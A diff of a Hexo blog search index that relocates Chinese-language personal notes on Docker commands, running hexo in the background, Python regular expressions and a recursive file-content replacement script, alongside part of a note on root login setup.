     <content><![CDATA[<h1 id="docker运行"><a href="#docker运行" class="headerlink" title="docker运行"></a>docker运行</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name &lt;name&gt; &lt;image&gt;    #启动</span><br><span class="line">docker run -itd --name &lt;name&gt; &lt;image&gt;    #后台启动</span><br><span class="line">docker exec -it &lt;container&gt; &#x2F;bin&#x2F;bash    #运行后台程序 #&#x2F;bin&#x2F;bash就是返回命令行，在启动容器时系统默认添加，但是运行后台容器时必须手动加上去</span><br><span class="line">docker export 1e560fca3906 &gt; ubuntu.tar    #导出容器</span><br><span class="line">cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1    #导入容器快照</span><br><span class="line">docker container prune    #删除所有容器</span><br><span class="line">docker commit -m&#x3D;&quot;描述信息&quot; -a&#x3D;&quot;作者&quot; e218edb10161 runoob&#x2F;ubuntu:v2    #创建镜像</span><br><span class="line">docker run -itd --name my-nginx -p 8088:80 docker.io&#x2F;nginx &#x2F;bin&#x2F;bash   #端口转发</span><br></pre></td></tr></table></figure>
 
 <h1 id="hexo后台运行"><a href="#hexo后台运行" class="headerlink" title="hexo后台运行"></a>hexo后台运行</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo s &amp;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用python更改一个文件夹中所有文件内容</title>
+    <url>/2020/05/29/note/note2/</url>
+    <content><![CDATA[<h1 id="python设置中文编码"><a href="#python设置中文编码" class="headerlink" title="python设置中文编码"></a>python设置中文编码</h1><p>在程序的开头加上一句</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br></pre></td></tr></table></figure>
+<p>其中第一行是将py文件设置成可直接使用<code>./name.py</code>执行<br>第一行不适用于windows，而且中间不能有空格<br>第二行等式两边不能有空格，加上第二行就可以中文输出了</p>
+<h1 id="python正则表达式"><a href="#python正则表达式" class="headerlink" title="python正则表达式"></a>python正则表达式</h1><h2 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h2><p>一、函数语法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>二、函数参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pattern</td>
+<td>匹配的正则表达式</td>
+</tr>
+<tr>
+<td>string</td>
+<td>要匹配的字符串</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等</td>
+</tr>
+</tbody></table>
+<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。<br>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
+<table>
+<thead>
+<tr>
+<th>匹配对象方法</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>group(num=0)</td>
+<td>匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组</td>
+</tr>
+<tr>
+<td>groups()</td>
+<td>返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
+</tr>
+</tbody></table>
+<p>三、实例</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*- </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">print(re.search(<span class="string">'www'</span>, <span class="string">'www.runoob.com'</span>).span())  <span class="comment"># 在起始位置匹配</span></span><br><span class="line">print(re.search(<span class="string">'com'</span>, <span class="string">'www.runoob.com'</span>).span())         <span class="comment"># 不在起始位置匹配</span></span><br></pre></td></tr></table></figure>
+<p>以上实例运行输出结果为：</p>
+<blockquote>
+<p>(0, 3)<br>(11, 14)</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line"> </span><br><span class="line">searchObj = re.search( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> searchObj:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group() : "</span>, searchObj.group()</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group(1) : "</span>, searchObj.group(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group(2) : "</span>, searchObj.group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Nothing found!!"</span></span><br></pre></td></tr></table></figure>
+<p>以上实例执行结果如下：</p>
+<blockquote>
+<p>searchObj.group() :  Cats are smarter than dogs<br>searchObj.group(1) :  Cats<br>searchObj.group(2) :  smarter</p>
+</blockquote>
+<h2 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h2><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。<br><strong>注意</strong>： match 和 search 是匹配一次 findall 匹配所有。<br>语法格式为：</p>
+<blockquote>
+<p>findall(string[, pos[, endpos]])  </p>
+</blockquote>
+<p>参数：</p>
+<ul>
+<li><b>string:</b>待匹配的字符串。</li>
+<li><b>pos:</b>可选参数，指定字符串的起始位置，默认为 0。</li>
+<li><b>endpos:</b> 可选参数，指定字符串的结束位置，默认为字符串的长度。</li>
+</ul>
+<p>查找字符串中的所有数字：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)   <span class="comment"># 查找数字</span></span><br><span class="line">result1 = pattern.findall(<span class="string">'runoob 123 google 456'</span>)</span><br><span class="line">result2 = pattern.findall(<span class="string">'run88oob123google456'</span>, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">print(result1)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<blockquote>
+<p>[‘123’, ‘456’]<br>[‘88’, ‘12’]</p>
+</blockquote>
+<h2 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h2><p>Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。<br>语法：</p>
+<blockquote>
+<p>re.sub(pattern, repl, string, count=0, flags=0)</p>
+</blockquote>
+<p>参数：  </p>
+<ul>
+<li>pattern : 正则中的模式字符串。</li>
+<li>repl : 替换的字符串，也可为一个函数。</li>
+<li>string : 要被查找替换的原始字符串。</li>
+<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
+</ul>
+<p>实例:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">phone = <span class="string">"2004-959-559 # 这是一个国外电话号码"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除字符串中的 Python注释 </span></span><br><span class="line">num = re.sub(<span class="string">r'#.*$'</span>, <span class="string">""</span>, phone)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"电话号码是: "</span>, num</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除非数字(-)的字符串 </span></span><br><span class="line">num = re.sub(<span class="string">r'\D'</span>, <span class="string">""</span>, phone)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"电话号码是 : "</span>, num</span><br></pre></td></tr></table></figure>
+<p>以上实例执行结果如下：</p>
+<blockquote>
+<p>电话号码是:  2004-959-559<br>电话号码是 :  2004959559</p>
+</blockquote>
+<p><b>repl 参数是一个函数</b></p>
+<p>以下实例中将字符串中的匹配的数字乘以 2：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(matched)</span>:</span></span><br><span class="line">    value = int(matched.group(<span class="string">'value'</span>))</span><br><span class="line">    <span class="keyword">return</span> str(value * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">'A23G4HFD567'</span></span><br><span class="line">print(re.sub(<span class="string">'(?P&lt;value&gt;\d+)'</span>, double, s))</span><br></pre></td></tr></table></figure>
+<p>执行输出结果为：</p>
+<blockquote>
+<p>A46G8HFD1134</p>
+</blockquote>
+<h1 id="使用python更换文件内容"><a href="#使用python更换文件内容" class="headerlink" title="使用python更换文件内容"></a>使用python更换文件内容</h1><p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cos_to_cdn</span><span class="params">(path,patterm,repl)</span>:</span></span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path+<span class="string">'/'</span>+file):</span><br><span class="line">            cos_to_cdn(path+<span class="string">'/'</span>+file,patterm,repl)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">            f = open(path+<span class="string">'/'</span>+file,<span class="string">'r'</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> re.findall(patterm,line):</span><br><span class="line">                    line = re.sub(patterm,repl,line)</span><br><span class="line">                s += line</span><br><span class="line">            f.close()</span><br><span class="line">            fw = open(path+<span class="string">'/'</span>+file,<span class="string">'w'</span>)</span><br><span class="line">            fw.write(s)</span><br><span class="line">            fw.close()</span><br><span class="line"></span><br><span class="line">path = <span class="string">r'******'</span>   <span class="comment">#输入要替换的文件夹</span></span><br><span class="line">patterm = <span class="string">r'*********'</span>  <span class="comment">#要替换的字符串的正则表达式</span></span><br><span class="line">repl = <span class="string">r'*********'</span> <span class="comment">#替换后的字符串</span></span><br><span class="line">cos_to_cdn(path,patterm,repl)</span><br></pre></td></tr></table></figure>
+<p>此脚本可以迭代替换，也就是说如果文件夹中还有文件夹，则子文件夹中的内容也会被替换</p>
 ]]></content>
       <tags>
         <tag>note</tag>
@@ -426,112 +532,6 @@
 <h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>修改<code>/root/.profile</code>文件 </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;root&#x2F;.profile</span><br></pre></td></tr></table></figure>
 <p>将文件末尾的<code>mesg n || true</code>这一行修改成<code>tty -s&amp;&amp;mesg n || true</code>，保存<br>重启系统，输入root用户名和密码，登陆系统</p>
-]]></content>
-      <tags>
-        <tag>note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用python更改一个文件夹中所有文件内容</title>
-    <url>/2020/05/29/note/note2/</url>
-    <content><![CDATA[<h1 id="python设置中文编码"><a href="#python设置中文编码" class="headerlink" title="python设置中文编码"></a>python设置中文编码</h1><p>在程序的开头加上一句</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br></pre></td></tr></table></figure>
-<p>其中第一行是将py文件设置成可直接使用<code>./name.py</code>执行<br>第一行不适用于windows，而且中间不能有空格<br>第二行等式两边不能有空格，加上第二行就可以中文输出了</p>
-<h1 id="python正则表达式"><a href="#python正则表达式" class="headerlink" title="python正则表达式"></a>python正则表达式</h1><h2 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h2><p>一、函数语法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>二、函数参数说明</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>pattern</td>
-<td>匹配的正则表达式</td>
-</tr>
-<tr>
-<td>string</td>
-<td>要匹配的字符串</td>
-</tr>
-<tr>
-<td>flags</td>
-<td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等</td>
-</tr>
-</tbody></table>
-<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。<br>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
-<table>
-<thead>
-<tr>
-<th>匹配对象方法</th>
-<th>函数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>group(num=0)</td>
-<td>匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组</td>
-</tr>
-<tr>
-<td>groups()</td>
-<td>返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
-</tr>
-</tbody></table>
-<p>三、实例</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*- </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">print(re.search(<span class="string">'www'</span>, <span class="string">'www.runoob.com'</span>).span())  <span class="comment"># 在起始位置匹配</span></span><br><span class="line">print(re.search(<span class="string">'com'</span>, <span class="string">'www.runoob.com'</span>).span())         <span class="comment"># 不在起始位置匹配</span></span><br></pre></td></tr></table></figure>
-<p>以上实例运行输出结果为：</p>
-<blockquote>
-<p>(0, 3)<br>(11, 14)</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line"> </span><br><span class="line">searchObj = re.search( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> searchObj:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group() : "</span>, searchObj.group()</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group(1) : "</span>, searchObj.group(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"searchObj.group(2) : "</span>, searchObj.group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Nothing found!!"</span></span><br></pre></td></tr></table></figure>
-<p>以上实例执行结果如下：</p>
-<blockquote>
-<p>searchObj.group() :  Cats are smarter than dogs<br>searchObj.group(1) :  Cats<br>searchObj.group(2) :  smarter</p>
-</blockquote>
-<h2 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h2><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。<br><strong>注意</strong>： match 和 search 是匹配一次 findall 匹配所有。<br>语法格式为：</p>
-<blockquote>
-<p>findall(string[, pos[, endpos]])  </p>
-</blockquote>
-<p>参数：</p>
-<ul>
-<li><b>string:</b>待匹配的字符串。</li>
-<li><b>pos:</b>可选参数，指定字符串的起始位置，默认为 0。</li>
-<li><b>endpos:</b> 可选参数，指定字符串的结束位置，默认为字符串的长度。</li>
-</ul>
-<p>查找字符串中的所有数字：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)   <span class="comment"># 查找数字</span></span><br><span class="line">result1 = pattern.findall(<span class="string">'runoob 123 google 456'</span>)</span><br><span class="line">result2 = pattern.findall(<span class="string">'run88oob123google456'</span>, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">print(result1)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure>
-<p>输出结果：</p>
-<blockquote>
-<p>[‘123’, ‘456’]<br>[‘88’, ‘12’]</p>
-</blockquote>
-<h2 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h2><p>Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。<br>语法：</p>
-<blockquote>
-<p>re.sub(pattern, repl, string, count=0, flags=0)</p>
-</blockquote>
-<p>参数：  </p>
-<ul>
-<li>pattern : 正则中的模式字符串。</li>
-<li>repl : 替换的字符串，也可为一个函数。</li>
-<li>string : 要被查找替换的原始字符串。</li>
-<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
-</ul>
-<p>实例:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">phone = <span class="string">"2004-959-559 # 这是一个国外电话号码"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除字符串中的 Python注释 </span></span><br><span class="line">num = re.sub(<span class="string">r'#.*$'</span>, <span class="string">""</span>, phone)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"电话号码是: "</span>, num</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除非数字(-)的字符串 </span></span><br><span class="line">num = re.sub(<span class="string">r'\D'</span>, <span class="string">""</span>, phone)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"电话号码是 : "</span>, num</span><br></pre></td></tr></table></figure>
-<p>以上实例执行结果如下：</p>
-<blockquote>
-<p>电话号码是:  2004-959-559<br>电话号码是 :  2004959559</p>
-</blockquote>
-<p><b>repl 参数是一个函数</b></p>
-<p>以下实例中将字符串中的匹配的数字乘以 2：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(matched)</span>:</span></span><br><span class="line">    value = int(matched.group(<span class="string">'value'</span>))</span><br><span class="line">    <span class="keyword">return</span> str(value * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">'A23G4HFD567'</span></span><br><span class="line">print(re.sub(<span class="string">'(?P&lt;value&gt;\d+)'</span>, double, s))</span><br></pre></td></tr></table></figure>
-<p>执行输出结果为：</p>
-<blockquote>
-<p>A46G8HFD1134</p>
-</blockquote>
-<h1 id="使用python更换文件内容"><a href="#使用python更换文件内容" class="headerlink" title="使用python更换文件内容"></a>使用python更换文件内容</h1><p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cos_to_cdn</span><span class="params">(path,patterm,repl)</span>:</span></span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path+<span class="string">'/'</span>+file):</span><br><span class="line">            cos_to_cdn(path+<span class="string">'/'</span>+file,patterm,repl)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">            f = open(path+<span class="string">'/'</span>+file,<span class="string">'r'</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> re.findall(patterm,line):</span><br><span class="line">                    line = re.sub(patterm,repl,line)</span><br><span class="line">                s += line</span><br><span class="line">            f.close()</span><br><span class="line">            fw = open(path+<span class="string">'/'</span>+file,<span class="string">'w'</span>)</span><br><span class="line">            fw.write(s)</span><br><span class="line">            fw.close()</span><br><span class="line"></span><br><span class="line">path = <span class="string">r'******'</span>   <span class="comment">#输入要替换的文件夹</span></span><br><span class="line">patterm = <span class="string">r'*********'</span>  <span class="comment">#要替换的字符串的正则表达式</span></span><br><span class="line">repl = <span class="string">r'*********'</span> <span class="comment">#替换后的字符串</span></span><br><span class="line">cos_to_cdn(path,patterm,repl)</span><br></pre></td></tr></table></figure>
-<p>此脚本可以迭代替换，也就是说如果文件夹中还有文件夹，则子文件夹中的内容也会被替换</p>
 ]]></content>
       <tags>
         <tag>note</tag>
